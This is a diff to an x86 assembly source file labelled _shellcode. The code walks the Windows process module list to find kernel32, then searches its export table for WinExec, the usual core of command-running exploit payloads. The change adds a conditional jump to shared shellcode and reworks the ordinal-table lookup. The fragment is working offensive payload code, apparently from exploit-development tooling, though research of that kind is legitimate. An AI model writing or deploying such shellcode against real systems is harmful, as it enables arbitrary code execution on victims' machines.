@@ -46,6 +46,10 @@ _shellcode:
     MOV     ESI, [EAX]                    ; ESI = InLoadOrder[2] (kernel32)
     MOV     EDI, [ESI + 0x18]             ; EDI = [InLoadOrder[2] + 0x18] = kernel32 DllBase
 ; Found kernel32 base address (EDI)
+%ifdef USE_COMMON
+    MOV     DL, 0x50
+    JMP     shellcode_common
+%else
     MOV     EBX, [EDI + 0x3C]             ; EBX = [kernel32 + 0x3C] = offset(PE header)
 ; PE header (EDI+EBX) = @0x00 0x04 byte signature
 ;                       @0x04 0x18 byte COFF header
@@ -55,13 +59,13 @@ _shellcode:
     MOV     ESI, [EDI + EBX + 0x20]       ; ESI = [kernel32 + offset(export table) + 0x20] = offset(names table)
     ADD     ESI, EDI                      ; ESI = kernel32 + offset(names table) = &(names table)
 ; Found export names table (ESI)
-    MOV     ECX, [EDI + EBX + 0x24]       ; ECX = [kernel32 + offset(export table) + 0x20] = offset(ordinals table)
-    ADD     ECX, EDI                      ; ECX = kernel32 + offset(ordinals table) = ordinals table
-; Found export ordinals table (ECX)
+    MOV     EDX, [EDI + EBX + 0x24]       ; EDX = [kernel32 + offset(export table) + 0x24] = offset(ordinals table)
+; Found export ordinals table (EDX)
 find_winexec_x86:
 ; speculatively load ordinal (EBP)
-    MOVZX   EBP, WORD [ECX + EDX * 2]     ; EBP = [ordinals table + (WinExec function number + 1) * 2] = WinExec function ordinal (eventually)
-    INC     EDX                           ; EDX = function number + 1
+    MOVZX   EBP, WORD [EDI + EDX]         ; EBP = [kernel32 + offset(ordinals table) + offset] = function ordinal
+    INC     EDX
+    INC     EDX                           ; EDX = offset += 2
     LODSD                                 ; EAX = &(names table[function number]) = offset(function name)
     CMP     [EDI + EAX], DWORD B2DW('W', 'i', 'n', 'E') ; *(DWORD*)(function name) == "WinE" ?
     JNE     find_winexec_x86              ;
@@ -91,4 +95,5 @@ find_winexec_x86:
      POP    EAX
 %endif
      RET
+%endif
 %endif
